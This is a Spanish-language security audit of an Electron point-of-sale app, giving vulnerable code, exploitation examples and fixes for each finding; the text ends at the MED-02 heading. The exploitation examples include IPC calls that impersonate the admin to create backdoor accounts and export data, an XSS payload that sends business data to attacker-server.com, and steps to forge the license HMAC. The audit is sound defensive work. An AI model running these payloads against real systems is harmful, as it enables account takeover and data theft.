# INFORME DE SEGURIDAD - TOG Admin v1.2.1

## Auditoría de Seguridad Completa - Aplicación Electron

> **Estado de remediación:** ver `docs/historia/REMEDIACION_INFORME_SEGURIDAD.md`,
> donde cada hallazgo está certificado contra el código fuente (`src/`), con lo
> implementado, lo diferido y las remediaciones de este informe que **no** deben
> aplicarse al pie de la letra porque romperían el producto.
>
> **Nota (17-Sep-2026):** este documento imprimía el token real de Telegram en
> HIGH-07 y en el Anexo C. Los valores fueron redactados. El token expuesto hay
> que **rotarlo** (ver §9 del documento de remediación).

---

**Fecha de Auditoría:** 17 de Septiembre de 2026  
**Tipo de Aplicación:** Electron Desktop (POS / Sistema de Administración)  
**Versión Analizada:** v1.2.1  
**Metodología:** Ingeniería inversa del binario desempaquetado, análisis estático del código fuente, revisión de configuración de seguridad Electron, análisis de red y lógica de autenticación.

---

## Tabla de Contenidos

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Metodología de Auditoría](#2-metodología-de-auditoría)
3. [Arquitectura de la Aplicación](#3-arquitectura-de-la-aplicación)
4. [Vulnerabilidades Críticas](#4-vulnerabilidades-críticas)
5. [Vulnerabilidades Altas](#5-vulnerabilidades-altas)
6. [Vulnerabilidades Medias](#6-vulnerabilidades-medias)
7. [Vulnerabilidades Bajas](#7-vulnerabilidades-bajas)
8. [Buenas Prácticas Encontradas](#8-buenas-prácticas-encontradas)
9. [Mapa de Amenazas](#9-mapa-de-amenazas)
10. [Plan de Remediación](#10-plan-de-remediación)
11. [Anexos](#11-anexos)

---

## 1. Resumen Ejecutivo

### Hallazgos Totales

| Severidad | Cantidad | Impacto |
|-----------|----------|---------|
| **Crítica** | 5 | Acceso total al sistema, robo de credenciales, ejecución remota de código |
| **Alta** | 8 | Escalada de privilegios, interceptación de datos, falsificación de licencias |
| **Media** | 9 | Lectura de archivos arbitrarios, inyección de contenido, abuso de recursos |
| **Baja** | 5 | Información expuesta, configuración subóptima |
| **TOTAL** | **27** | |

### Nivel de Riesgo General: **CRÍTICO**

La aplicación presenta múltiples vulnerabilidades que, combinadas, permiten a un atacante:

1. Obtener credenciales de administrador sin autenticación
2. Acceder a la base de datos completa del negocio
3. Crear usuarios administradores remotos
4. Interceptar todo el tráfico de red (ventas, licencias, datos financieros)
5. Falsificar licencias de software
6. Ejecutar operaciones de base de datos desde cualquier punto de la red local

---

## 2. Metodología de Auditoría

### 2.1 Extracción y Análisis

```
Binario original: TOG Admin.exe (180 MB)
Framework: Electron (Chromium-based)
Extracción: npx asar extract app.asar app-extracted
Archivos analizados: Todos los archivos en dist-electron/, src/, resources/
```

### 2.2 Áreas de Análisis

- Configuración de seguridad del BrowserWindow Electron
- Sistema de autenticación y autorización (login, sesiones, permisos)
- Comunicación IPC entre renderer y main process
- Servidor de red (Base PC ↔ Child PC)
- Sistema de licencias y HMAC
- Gestión de archivos y base de datos
- Manejo de secretos y credenciales
- Política de Seguridad de Contenido (CSP)
- Dependencias de npm incluidas en el paquete

### 2.3 Herramientas Utilizadas

- Análisis estático del código JavaScript/TypeScript transpilado
- Revisión manual de handlers IPC
- Inspección de configuración de red y TLS
- Análisis de generación de credenciales
- Revisión de lógica de autorización por roles

---

## 3. Arquitectura de la Aplicación

### 3.1 Componentes Principales

```
┌─────────────────────────────────────────────────────┐
│                  TOG Admin v1.2.1                    │
├─────────────────────────────────────────────────────┤
│  Renderer Process (Chromium)                        │
│  ├── Interfaz de usuario (HTML/CSS/JS)              │
│  ├── Framework UI (no identificado específicamente) │
│  └── Preload Bridge (contextBridge)                 │
├─────────────────────────────────────────────────────┤
│  Main Process (Node.js)                             │
│  ├── IPC Handlers (255+ canales)                    │
│  ├── Base de Datos SQLite (better-sqlite3)          │
│  ├── Servidor de Red (HTTP/HTTPS)                   │
│  ├── Cliente de Red (HTTP/HTTPS)                    │
│  ├── Sistema de Licencias                           │
│  ├── Impresora (Serial Port)                        │
│  ├── Updater (electron-updater)                     │
│  └── Telegram Bot (feedback)                        │
├─────────────────────────────────────────────────────┤
│  Capa de Red (Base PC ↔ Child PC)                   │
│  ├── RPC sobre HTTP/HTTPS                           │
│  ├── Certificados TLS auto-firmados                 │
│  └── Emparejamiento por código de 6 caracteres      │
└─────────────────────────────────────────────────────┘
```

### 3.2 Flujo de Autenticación (Actual - Vulnerable)

```
┌──────────┐     ┌──────────────┐     ┌──────────────┐
│ Renderer │────▶│ IPC invoke   │────▶│ Main Process │
│          │     │ usuario_id:  │     │              │
│          │     │     1        │────▶│ checkPerm()  │
└──────────┘     └──────────────┘     │   ↳ usa      │
                                      │   usuario_id │
                                      │   del cliente│
                                      └──────────────┘

PROBLEMA: El usuario_id viene del cliente sin verificación.
Cualquier llamada IPC puede incluir usuario_id: 1 (admin).
```

---

## 4. Vulnerabilidades Críticas

---

### CRIT-01: Función `invoke` Genérica Expone Todos los Canales IPC

**Severidad:** CRÍTICA  
**CVSS Estimado:** 9.8  
**Archivo:** `dist-electron/main/preload.js`  
**Líneas:** 6-9  
**Categoría:** Escalada de Privilegios / Bypass de Seguridad

#### Código Vulnerable

```javascript
// preload.js
electron_1.contextBridge.exposeInMainWorld('api', {
    invoke: (channel, ...args) => {
        return electron_1.ipcRenderer.invoke(channel, ...args);
    },
    // ... más métodos específicos ...
});
```

#### Descripción Detallada

El script de preload expone una función `invoke` genérica que permite al renderer process invocar **cualquier canal IPC** por nombre. Esta función actúa como un "backdoor" que anula por completo la superficie de API tipada que se supone debe existir.

En una configuración correcta de Electron, el preload solo debe exponer funciones específicas y acotadas. Aquí, la función genérica permite pasar cualquier string como nombre de canal, lo que significa que el renderer puede acceder a:

- `db:reset` - Resetear toda la base de datos
- `usuarios:create` - Crear usuarios administradores
- `usuarios:delete` - Eliminar usuarios
- `config:set` - Modificar cualquier configuración
- `license:import` - Importar licencias falsificadas
- `backup:restore` - Restaurar backups arbitrarios
- `backup:create` - Crear backups de toda la BD
- `red:vincular` - Emparejar nuevos PC
- Cualquiera de los 255+ canales registrados

#### Cómo se Explota

```javascript
// Desde la consola del navegador (si hay XSS) o desde el DevTools:
window.api.invoke('db:reset', { usuario_id: 1 });
window.api.invoke('usuarios:create', {
    usuario_id: 1,
    usuario: 'hacker',
    contrasena: 'hacked123',
    nombre: 'Backdoor Admin',
    rol: 'admin'
});
window.api.invoke('backup:create', { usuario_id: 1 });
// El atacante obtiene un backup completo de la base de datos
```

#### Vector de Ataque

1. **XSS en la UI** - Cualquier vulnerabilidad de inyección de contenido en la interfaz
2. **Dependencia npm comprometida** - Un paquete malicioso que inyecte código en el renderer
3. **Archivo HTML local manipulado** - Si el contenido se carga desde archivos locales
4. **Middleware de red** - Interceptación y modificación del contenido servido

#### Impacto

- Acceso completo a la base de datos del negocio (ventas, productos, clientes, proveedores)
- Creación de usuarios administradores persistentes
- Eliminación o modificación de datos
- Exportación de toda la información sensible
- Manipulación de licencias

#### Remediación

```javascript
// preload.js CORREGIDO - Solo exponer funciones específicas
electron_1.contextBridge.exposeInMainWorld('api', {
    // Solo las funciones que el renderer realmente necesita
    login: (data) => electron_1.ipcRenderer.invoke('auth:login', data),
    logout: () => electron_1.ipcRenderer.invoke('auth:logout'),
    getProductos: (data) => electron_1.ipcRenderer.invoke('productos:list', data),
    // ... etc, una por una, explícitamente
});
```

---

### CRIT-02: Sin Validación de Sesión en Servidor - `usuario_id` Controlado por el Cliente

**Severidad:** CRÍTICA  
**CVSS Estimado:** 9.8  
**Archivos:** `dist-electron/main/core/auth/permissions.js` (Líneas 60-65), `dist-electron/main/services/permissions.js` (Líneas 56-60)  
**Categoría:** Escalada de Privilegios / Bypass de Autenticación

#### Código Vulnerable

```javascript
// permissions.js
function extractUserId(data) {
    if (data && typeof data.usuario_id === 'number')
        return data.usuario_id;
    return null;
}

// Uso en cada handler:
function checkPermissionOrFail(data, canal, permiso) {
    const userId = extractUserId(data);  // ← Viene del cliente
    const user = getUserById(userId);     // ← Consulta la BD
    if (!user) return { success: false, error: 'Usuario no encontrado' };
    // ... verifica permisos del usuario ...
}
```

#### Descripción Detallada

TODO el sistema de autorización se construye sobre la premisa de que el cliente envía un `usuario_id` legítimo. No existe:

- **Token de sesión** validado criptográficamente
- **JWT** con firma verificada
- **Token de acceso** generado por el servidor
- **Ninguna vinculación criptográfica** entre la sesión real y la llamada IPC

Aunque existe un módulo `red-session.js` que crea tokens de sesión, estos **nunca se validan** contra las llamadas IPC del renderer local.

#### Flujo de Ataque

```
1. Atacante obtiene acceso al renderer (XSS, DevTools, etc.)
2. Atacante llama a cualquier canal IPC con usuario_id: 1
3. El servidor busca usuario ID 1 en la BD (es el admin)
4. El servidor verifica permisos del admin → tiene todos
5. La operación se ejecuta exitosamente
```

#### Ejemplo de Explotación

```javascript
// Crear usuario admin sin tener credenciales
window.api.invoke('usuarios:create', {
    usuario_id: 1,  // ← El atacante se hace pasar por admin
    usuario: 'backdoor',
    contrasena: 'insecure123',
    nombre: 'Hacker Account',
    rol: 'admin'
});

// Resetear la base de datos
window.api.invoke('db:reset', { usuario_id: 1 });

// Exportar todos los datos de ventas
window.api.invoke('ventas:export', { usuario_id: 1, fecha_inicio: '2020-01-01', fecha_fin: '2026-12-31' });
```

#### Impacto

- Cualquier usuario (incluso uno recién creado con rol "cajero") puede ejecutar operaciones de administrador
- No hay forma de audit quién realizó realmente una operación
- El sistema de permisos es completamente ilusorio

#### Remediación

```javascript
// CORREGIDO - Validar sesión en cada handler
function checkPermissionOrFail(data, canal, permiso) {
    const sessionToken = data?.session_token;
    if (!sessionToken) return { success: false, error: 'Sesión requerida' };

    const session = validateSession(sessionToken);  // ← Validación criptográfica
    if (!session) return { success: false, error: 'Sesión inválida' };

    const user = getUserById(session.userId);
    if (!user) return { success: false, error: 'Usuario no encontrado' };

    // Continuar con verificación de permisos...
}
```

---

### CRIT-03: Password de Admin Escrito en Texto Plano y Nunca Eliminado

**Severidad:** CRÍTICA  
**CVSS Estimado:** 9.1  
**Archivo:** `dist-electron/main/db/database.js`  
**Líneas:** 1257-1275  
**Categoría:** Exposición de Credenciales / Almacenamiento Inseguro

#### Código Vulnerable

```javascript
// database.js - Durante el seeding de la base de datos
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
let adminPassword = '';
for (let i = 0; i < 12; i++) {
    adminPassword += chars.charAt(Math.floor(Math.random() * chars.length));
}

const initialPasswordPath = require('path').join(
    require('electron').app.getPath('userData'),
    'admin-initial-password.txt'
);
require('fs').writeFileSync(initialPasswordPath, adminPassword, 'utf8');

// ⚠️ NUNCA se llama a fs.unlinkSync(initialPasswordPath)
// El archivo persiste indefinidamente
```

#### Descripción Detallada

Cuando la aplicación se inicializa por primera vez:

1. Se genera una contraseña aleatoria de 12 caracteres
2. Se escribe en `%APPDATA%/tog-admin/admin-initial-password.txt`
3. Se usa `Math.random()` (NO criptográficamente seguro) para la generación
4. **El archivo NUNCA se elimina** después del primer uso
5. El archivo es legible por cualquier proceso del mismo usuario

#### Rutas de Archivo Expuestas

```
Windows: C:\Users\<usuario>\AppData\Roaming\tog-admin\admin-initial-password.txt
macOS:   ~/Library/Application Support/tog-admin/admin-initial-password.txt
Linux:   ~/.config/tog-admin/admin-initial-password.txt
```

#### Impacto

- Cualquier malware, script o usuario en la máquina puede leer la contraseña
- La contraseña persiste indefinidamente (meses, años)
- Genera una superficie de ataque permanente

#### Remediación

```javascript
// CORREGIDO
const adminPassword = crypto.randomBytes(12).toString('base64url');
// ... usar para hash bcrypt ...
// ELIMINAR el archivo después de usarlo:
try {
    fs.unlinkSync(initialPasswordPath);
} catch (e) {
    // Ignorar si no existe
}
```

---

### CRIT-04: Password de Admin Expuesto sin Autenticación (Canal PREAUTH)

**Severidad:** CRÍTICA  
**CVSS Estimado:** 9.1  
**Archivos:** `dist-electron/main/modules/license/handlers.js` (Líneas 92-94), `dist-electron/shared/ipc-channels.js` (Líneas 256-275)  
**Categoría:** Exposición de Credenciales / Bypass de Autenticación

#### Código Vulnerable

```javascript
// handlers.js
(0, ipc_guard_1.handleIpc)('license:initial-password', async () => {
    return { password: getInitialPassword() };
});

// ipc-channels.js
exports.PREAUTH_CHANNELS = [
    'app:version',
    'auth:login',
    'license:initial-password',  // ← SIN AUTENTICACIÓN
    // ...
];
```

#### Descripción Detallada

El canal `license:initial-password` está en la lista de canales PREAUTH (pre-autenticación). Esto significa:

1. **No requiere sesión activa** para ser llamado
2. **Es accesible desde la red** a través del endpoint RPC del servidor
3. **Retorna la contraseña admin** en texto plano
4. **Cualquier PC emparejado** puede llamarlo

#### Flujo de Ataque desde la Red

```
PC Atacante (Child PC emparejada)          Base PC (Target)
          │                                       │
          │  POST /api/red/rpc                    │
          │  {                                    │
          │    "canal": "license:initial-password",│
          │    "args": [],                        │
          │    "par_id": "<par_id_valido>",       │
          │    "cert_hash": "<hash_valido>"       │
          │  }                                    │
          │──────────────────────────────────────▶│
          │                                       │
          │  200 OK                               │
          │  { "password": "Abc123xyz789" }       │
          │◀──────────────────────────────────────│
          │                                       │
          │  Ahora tiene la contraseña admin       │
```

#### Impacto

- Obtención remota de la contraseña de administrador
- No requiere autenticación previa
- Accesible desde cualquier PC emparejada en la red

#### Remediación

```javascript
// CORREGIDO - Remover de PREAUTH_CHANNELS
// O agregar validación de sesión dentro del handler:
(0, ipc_guard_1.handleIpc)('license:initial-password', async (_event, data) => {
    const fail = checkPermissionOrFail(data, 'license:initial-password', 'admin_access');
    if (fail) return fail;
    return { password: getInitialPassword() };
});
```

---

### CRIT-05: Verificación de Certificados TLS Deshabilitada (`rejectUnauthorized: false`)

**Severidad:** CRÍTICA  
**CVSS Estimado:** 8.1  
**Archivo:** `dist-electron/main/services/red-client.js`  
**Líneas:** 24-30  
**Categoría:** Criptografía Débil / Man-in-the-Middle

#### Código Vulnerable

```javascript
// red-client.js
function agentFor(baseUrl, caPem) {
    const isHttps = baseUrl.startsWith('https://');
    if (isHttps) {
        return new node_https_1.default.Agent({
            ca: caPem ?? undefined,
            rejectUnauthorized: caPem ? true : false,  // ← FALSE sin CA cert
            keepAlive: false,
        });
    }
    return new node_http_1.default.Agent({ keepAlive: false });
}
```

#### Descripción Detallada

Cuando un Child PC se conecta a un Base PC por HTTPS **sin** haber recibido el certificado CA (`caPem` es null/undefined), la verificación de certificados se deshabilita completamente. Esto significa:

1. El cliente acepta **cualquier** certificado TLS
2. Un atacante puede presentar su propio certificado
3. Todo el tráfico puede ser interceptado y descifrado
4. Las credenciales de login se transmiten en texto plano para el atacante

#### Escenario de Ataque: Man-in-the-Middle

```
┌──────────┐         ┌──────────────┐         ┌──────────┐
│ Child PC │────┬───▶│  Atacante    │────┬───▶│ Base PC  │
│          │    │    │  (ARP Spoof) │    │    │          │
└──────────┘    │    └──────────────┘    │    └──────────┘
                │                        │
                │  TLS Handshake         │
                │  (Acepta cert          │
                │   auto-firmado del     │
                │   atacante)            │
                │                        │
                │◀── Tráfico descifrado ──▶│
```

#### Datos Interceptados

- Credenciales de login (usuario + contraseña hasheada)
- Datos de ventas y transacciones
- Información de clientes y proveedores
- Claves de API (Odds API, Racing API)
- Datos de licencias
- Todo el tráfico entre PC

#### Remediación

```javascript
// CORREGIDO - Siempre verificar certificados
function agentFor(baseUrl, caPem) {
    const isHttps = baseUrl.startsWith('https://');
    if (isHttps) {
        if (!caPem) {
            throw new Error('CA certificate required for HTTPS connections');
        }
        return new node_https_1.default.Agent({
            ca: caPem,
            rejectUnauthorized: true,  // SIEMPRE true
            keepAlive: false,
        });
    }
    return new node_http_1.default.Agent({ keepAlive: false });
}
```

---

## 5. Vulnerabilidades Altas

---

### HIGH-01: Servidor de Red Bindea a `0.0.0.0` (Todas las Interfaces de Red)

**Severidad:** ALTA  
**CVSS Estimado:** 7.5  
**Archivo:** `dist-electron/main/services/red-server.js`  
**Línea:** 321  
**Categoría:** Exposición de Superficie de Ataque

#### Código Vulnerable

```javascript
// red-server.js
server.listen(port, '0.0.0.0', () => {
    console.log(`[Red] Servidor escuchando en puerto ${port}`);
});
```

#### Descripción Detallada

El servidor de red escucha en **todas** las interfaces de red (`0.0.0.0`), incluyendo:

- LAN local
- VPN (si existe)
- IP pública (si el PC tiene una)
- Interfaces de Docker/WSL

Esto expone los endpoints RPC a:
- Cualquier dispositivo en la LAN
- Internet (si el puerto 3002 está redirigido)
- Contenedores Docker o máquinas virtuales

#### Endpoints Expuestos

```
GET  /api/red/status          - Estado del servidor
POST /api/red/rpc             - Ejecución de handlers IPC
POST /api/red/vincular        - Emparejamiento de PC
POST /api/red/desvincular     - Desemparejamiento
POST /api/red/heartbeat       - Heartbeat
```

#### Remediación

```javascript
// CORREGIDO - Escuchar solo en interfaz local
server.listen(port, '127.0.0.1', () => {
    console.log(`[Red] Servidor escuchando en localhost:${port}`);
});

// O mejor, en la IP específica de la LAN:
server.listen(port, localIpAddress, () => {
    console.log(`[Red] Servidor escuchando en ${localIpAddress}:${port}`);
});
```

---

### HIGH-02: RPC Ejecuta Cualquier Handler IPC Registrado desde la Red

**Severidad:** ALTA  
**CVSS Estimado:** 7.5  
**Archivo:** `dist-electron/main/services/red-server.js`  
**Líneas:** 265-296  
**Categoría:** Ejecución Remota de Código / Diseño Inseguro

#### Código Vulnerable

```javascript
// red-server.js
if (path === '/api/red/rpc') {
    const { canal, args, par_id, cert_hash } = body;
    // ... validación de par_id y cert_hash ...
    const handler = deps.getHandler(canal);  // ← Lookup dinámico
    if (!handler) {
        return json(res, 404, { success: false, error: 'Canal no disponible' });
    }
    // Ejecuta el handler con argumentos arbitrarios
    handlerResponse = await handler(null, ...argsConPar);
}
```

#### Descripción Detallada

El endpoint RPC permite a un Child PC invocar **cualquier handler IPC registrado** por su nombre de canal. El lookup es dinámico (`deps.getHandler(canal)`), lo que significa:

1. Si se registra un nuevo handler sin actualizar `PREAUTH_CHANNELS`, se vuelve remotamente explotable
2. La arquitectura es frágil - cualquier cambio puede introducir vulnerabilidades
3. Los canales PREAUTH se ejecutan sin sesión activa

#### Canales PREAUTH Accesibles desde la Red

```javascript
exports.PREAUTH_CHANNELS = [
    'app:version',
    'auth:login',
    'crash-report:save',
    'feedback:send',
    'i18n:get-lang',
    'i18n:set-lang',
    'license:status',
    'license:sync',
    'license:sync-account',
    'license:validate',
    'license:import',           // ← Puede importar licencia falsa
    'license:initial-password', // ← Expone contraseña admin
    'license:machine-id',
    'license:rebind-device',
    'red:status',
    'red:vincular',
    'red:desvincular',
    'red:heartbeat',
];
```

#### Remediación

```javascript
// CORREGIDO - Validar sesión para canales sensibles
app.post('/api/red/rpc', async (req, res) => {
    const { canal, args, par_id, cert_hash, session_token } = body;

    // Validar par_id y cert_hash
    if (!validatePairing(par_id, cert_hash)) {
        return json(res, 401, { error: 'Pairing inválido' });
    }

    // Si el canal no es PREAUTH, validar sesión
    if (!PREAUTH_CHANNELS.includes(canal)) {
        if (!session_token || !validateSession(session_token)) {
            return json(res, 401, { error: 'Sesión requerida' });
        }
    }

    const handler = deps.getHandler(canal);
    // ...
});
```

---

### HIGH-03: `webSecurity` Deshabilitado y `allowRunningInsecureContent` Habilitado en Modo Dev

**Severidad:** ALTA  
**CVSS Estimado:** 7.4  
**Archivo:** `dist-electron/main/index.js`  
**Líneas:** 35-36  
**Categoría:** Configuración Insegura / Bypass de Same-Origin Policy

#### Código Vulnerable

```javascript
// index.js
webPreferences: {
    preload: path_1.default.join(__dirname, 'preload.js'),
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
    webSecurity: !isDev,           // false cuando isDev = true
    allowRunningInsecureContent: isDev,  // true cuando isDev = true
},
```

#### Descripción Detallada

El valor de `isDev` se determina por `!electron_1.app.isPackaged`. Cuando la app se ejecuta desde los archivos extraídos (no empaquetada), `isPackaged` es `false`, por lo que `isDev` es `true`.

Esto desactiva:
- **Same-Origin Policy** (`webSecurity: false`)
- **Bloqueo de contenido inseguro** (`allowRunningInsecureContent: true`)

#### Consecuencias

Con `webSecurity: false`:
- El renderer puede hacer requests cross-origin a cualquier dominio
- Puede leer archivos locales vía `file://` protocol
- Puede acceder a contenido de otros orígenes
- El CSP se vuelve inefectivo

#### Remediación

```javascript
// CORREGIDO - Nunca deshabilitar webSecurity
webPreferences: {
    preload: path_1.default.join(__dirname, 'preload.js'),
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
    webSecurity: true,              // SIEMPRE true
    allowRunningInsecureContent: false,  // SIEMPRE false
},
```

---

### HIGH-04: CSP permite `connect-src https:` - Exfiltración de Datos Ilimitada

**Severidad:** ALTA  
**CVSS Estimado:** 7.1  
**Archivo:** `dist-electron/main/index.js`  
**Línea:** 174  
**Categoría:** Política de Seguridad de Contenido Débil

#### Código Vulnerable

```javascript
// index.js
const PROD_CSP = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self' https:; ...";
```

#### Descripción Detallada

La directiva `connect-src 'self' https:` permite conexiones a **cualquier** endpoint HTTPS. Un atacante que logre inyectar JavaScript (XSS) puede:

1. Extraer datos sensibles de la BD a través de `window.api.invoke()`
2. Enviar los datos a cualquier servidor controlado por el atacante
3. El CSP no bloqueará la exfiltración porque `https:` lo permite

#### Ejemplo de Exfiltración

```javascript
// Script malicioso inyectado vía XSS
async function exfiltrateData() {
    const ventas = await window.api.invoke('ventas:list', { usuario_id: 1 });
    const clientes = await window.api.invoke('clientes:list', { usuario_id: 1 });
    const config = await window.api.invoke('config:get', { usuario_id: 1 });

    // Enviar a servidor del atacante - CSP no bloquea porque es HTTPS
    await fetch('https://attacker-server.com/collect', {
        method: 'POST',
        body: JSON.stringify({ ventas, clientes, config })
    });
}
```

#### Remediación

```javascript
// CORREGIDO - Restringir connect-src a dominios específicos
const PROD_CSP = `
    default-src 'self';
    script-src 'self';
    style-src 'self';
    img-src 'self' data: blob:;
    font-src 'self' data:;
    connect-src 'self' https://api.telegram.org https://api.the-odds-api.com https://api.thoroughbredracing.com;
`;
```

---

### HIGH-05: HMAC de Licencia Derivado Únicamente de la Dirección MAC

**Severidad:** ALTA  
**CVSS Estimado:** 7.0  
**Archivo:** `dist-electron/main/services/license.js`  
**Líneas:** 27-41  
**Categoría:** Criptografía Débil / Falsificación

#### Código Vulnerable

```javascript
// license.js
function getHmacKey() {
    const interfaces = os_1.default.networkInterfaces();
    let mac = '';
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name] || []) {
            if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
                mac = iface.mac;
                break;
            }
        }
        if (mac) break;
    }
    return crypto_1.default.createHash('sha256').update(mac || 'unknown-license-state').digest('hex');
}
```

#### Descripción Detallada

La clave HMAC para verificar la integridad del estado de licencia se genera **únicamente** a partir de la dirección MAC. Problemas:

1. **La MAC es visible** - Cualquier proceso o escaneo de red puede verla
2. **La MAC es predecible** - No es un valor criptográficamente aleatorio
3. **La MAC es falsificable** - Se puede cambiar con herramientas como `macchanger`
4. **El espacio de búsqueda es pequeño** - Solo hay ~2^48 MACs posibles

#### Cómo se Falsifica la Licencia

```bash
# 1. Obtener la MAC del target
getmac /v  # Windows
ifconfig   # Linux/macOS

# 2. Calcular la clave HMAC
echo -n "AA:BB:CC:DD:EE:FF" | sha256sum
# → hash_result

# 3. Crear license.json con HMAC válido
# El atacante puede modificar lastKnownDate, trialEnd, etc.
```

#### Remediación

```javascript
// CORREGIDO - Usar clave generada aleatoriamente almacenada de forma segura
function getHmacKey() {
    const keyPath = path.join(app.getPath('userData'), '.license-key');
    if (fs.existsSync(keyPath)) {
        return fs.readFileSync(keyPath, 'utf8');
    }
    const newKey = crypto.randomBytes(32).toString('hex');
    fs.writeFileSync(keyPath, newKey, { mode: 0o600 });
    return newKey;
}
```

---

### HIGH-06: Password Admin Generado con `Math.random()` (No Criptográficamente Seguro)

**Severidad:** ALTA  
**CVSS Estimado:** 6.8  
**Archivo:** `dist-electron/main/db/database.js`  
**Líneas:** 1258-1261  
**Categoría:** Criptografía Débil

#### Código Vulnerable

```javascript
// database.js
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
let adminPassword = '';
for (let i = 0; i < 12; i++) {
    adminPassword += chars.charAt(Math.floor(Math.random() * chars.length));
}
```

#### Descripción Detallada

`Math.random()` no es un generador de números pseudo-aleatorios criptográficamente seguro (CSPRNG). Problemas:

1. **Predictible** - El algoritmo es conocido y el seed puede ser inferido
2. **Sin entropía real** - Depende del tiempo de ejecución u otras fuentes no criptográficas
3. **El resto de la app usa `crypto.randomBytes()`** correctamente - Inconsistencia

#### Comparación de Seguridad

```
Math.random():
- Entropía real: ~32 bits (dependiendo del seed)
- Predecibilidad: Alta (algoritmo conocido)
- Uso recomendado: Números de referencia, no seguridad

crypto.randomBytes():
- Entropía: 256 bits por cada 32 bytes
- Predecibilidad: Criptográficamente seguro
- Uso recomendado: Tokens, passwords, claves
```

#### Remediación

```javascript
// CORREGIDO
const crypto = require('crypto');
const adminPassword = crypto.randomBytes(12).toString('base64url');
```

---

### HIGH-07: Archivo `.env` con Secrets en Texto Plano en userData

**Severidad:** ALTA  
**CVSS Estimado:** 6.5  
**Archivos:** `resources/.env`, `dist-electron/main/core/env.js`  
**Líneas:** 17-33  
**Categoría:** Exposición de Credenciales

#### Contenido del `.env`

```env
# REDACTADO 2026-09-17 — ver Anexo C.
TELEGRAM_BOT_TOKEN=<redactado>
TELEGRAM_CHAT_ID=<redactado>
```

#### Código que Copia el `.env`

```javascript
// env.js
if (electron_1.app.isPackaged) {
    const userDataFile = path_1.default.join(electron_1.app.getPath('userData'), '.env');
    const resourcesFile = path_1.default.join(process.resourcesPath, '.env');
    if (fs_1.default.existsSync(resourcesFile)) {
        fs_1.default.copyFileSync(resourcesFile, userDataFile);
    }
    if (fs_1.default.existsSync(userDataFile)) {
        dotenv_1.default.config({ path: userDataFile, quiet: true });
    }
}
```

#### Descripción Detallada

El archivo `.env` contiene:
- **Token del bot de Telegram** - Permite enviar/reibir mensajes
- **Chat ID de Telegram** - Identifica el canal de comunicación

Este archivo se copia a `%APPDATA%/tog-admin/.env` y permanece en texto plano. Cualquier proceso del mismo usuario puede leerlo.

#### Impacto del Token de Telegram

Con el token, un atacante puede:
1. Enviar mensajes haciéndose pasar por el bot
2. Leer mensajes del chat (si el bot tiene permisos)
3. Usar el bot para phishing contra usuarios
4. Obtener información de la configuración del bot

#### Remediación

- No incluir tokens en archivos de configuración empaquetados
- Usar el sistema de credenciales del SO (Windows Credential Manager, Keychain)
- Si se usa `.env`, cifrarlo y descifrar en runtime

---

### HIGH-08: Canales PREAUTH Permiten Operaciones Sensibles sin Login

**Severidad:** ALTA  
**CVSS Estimado:** 6.5  
**Archivo:** `dist-electron/shared/ipc-channels.js`  
**Líneas:** 256-275  
**Categoría:** Bypass de Autenticación

#### Código Vulnerable

```javascript
// ipc-channels.js
exports.PREAUTH_CHANNELS = [
    'app:version',
    'auth:login',
    'crash-report:save',
    'feedback:send',
    'i18n:get-lang',
    'i18n:set-lang',
    'license:status',
    'license:sync',
    'license:sync-account',
    'license:validate',
    'license:import',           // ← IMPORTAR LICENCIA SIN LOGIN
    'license:initial-password', // ← OBTENER PASSWORD SIN LOGIN
    'license:machine-id',
    'license:rebind-device',
    'red:status',
    'red:vincular',             // ← EMPAREJAR PC SIN LOGIN
    'red:desvincular',
    'red:heartbeat',
];
```

#### Análisis de Canales Peligrosos en PREAUTH

| Canal | Riesgo |
|-------|--------|
| `license:import` | Permite importar una licencia falsificada sin estar logueado |
| `license:initial-password` | Expone la contraseña admin sin autenticación |
| `license:sync-account` | Puede autenticar con la plataforma TOG |
| `red:vincular` | Puede emparejar un nuevo PC malicioso |
| `feedback:send` | Puede spamhear el canal de Telegram |
| `crash-report:save` | Puede crear archivos arbitrarios en disco |

#### Remediación

Solo mantener en PREAUTH los canales absolutamente necesarios:
```javascript
exports.PREAUTH_CHANNELS = [
    'app:version',
    'auth:login',
    'i18n:get-lang',
    'i18n:set-lang',
    'license:validate',    // Necesario para verificar licencia antes del login
    'red:heartbeat',       // Heartbeat no requiere auth
];
// Remover: license:initial-password, license:import, red:vincular, etc.
```

---

## 6. Vulnerabilidades Medias

---

### MED-01: `config:set` Permite Almacenamiento de Key-Value Arbitrario sin Validación

**Severidad:** MEDIA  
**CVSS Estimado:** 5.5  
**Archivo:** `dist-electron/main/modules/configuracion/config.js`  
**Líneas:** 16-24  
**Categoría:** Validación Insuficiente

#### Código Vulnerable

```javascript
// config.js
(0, ipc_guard_1.handleIpc)('config:set', async (_event, data) => {
    const fail = (0, auth_1.checkPermissionOrFail)(data, 'config:set', 'config_edit');
    if (fail) return fail;
    const db = (0, database_1.getDatabase)();
    db.prepare("INSERT OR REPLACE INTO configuracion (clave, valor, actualizado_en) VALUES (?, ?, datetime('now'))")
        .run(data.clave, data.valor);
    return { success: true };
});
```

#### Descripción Detallada

El handler acepta **cualquier** par clave-valor sin validación. Un usuario con permiso `config_edit` puede sobrescribir configuraciones internas como:

- `red_modo` - Cambiar modo Base/Child
- `red_par_id` - Redirigir a otro servidor
- `red_base_url` - Cambiar URL del servidor
- `red_cert_hash` - Modificar hash de certificado
- `odds_api_key` - Robar clave API
- `racing_api_key` - Robar clave API

#### Remediación

```javascript
// CORREGIDO - Whitelist de claves permitidas
const ALLOWED_CONFIG_KEYS = [
    'business_name', 'currency', 'tax_rate',
    // Solo configuraciones de UI/negocio, NO de red/seguridad
];

if (!ALLOWED_CONFIG_KEYS.includes(data.clave)) {
    return { success: false, error: 'Clave de configuración no permitida' };
}
```

---

### MED-02: `usuarios:update` sin Validación de Enum en Campo `rol`

**Severidad:** MEDIA  
**CVSS Estimado:** 5.3  
